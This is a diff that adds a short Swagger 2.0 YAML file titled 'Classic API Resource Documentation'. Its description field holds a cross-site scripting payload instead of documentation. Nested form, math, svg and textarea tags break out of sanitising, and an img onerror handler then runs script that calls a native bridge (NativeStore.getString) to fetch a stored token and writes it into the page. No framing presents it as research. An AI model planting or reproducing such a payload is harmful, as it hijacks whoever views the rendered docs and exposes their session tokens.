@@ -1,0 +1,5 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='alert(1);var bridgeHandler=function(e,t,r,n){try{if(console.log("in try block"),r=atob(r),n=atob(n),!("string"==typeof r?JSON.parse(r):r).bridgeType)return;var o="string"==typeof n?JSON.parse(n)||{}:n;e&&JSON.parse(e);document.getElementById("myelement1").innerHTML=String(o.data.value)}catch(e){return void console.log("eror")}},bg1=bridgeHandler,fetchToken=function(){try{var e=btoa(JSON.stringify({bridgeType:"FETCH_TOKEN"})),t=btoa(JSON.stringify({key:"token"}));console.log("fetching Token"),NativeStore.getString(e,t,"bg1")}catch(e){console.log("error in fetching")}};fetchToken();alert(2);' src=1>"></form>
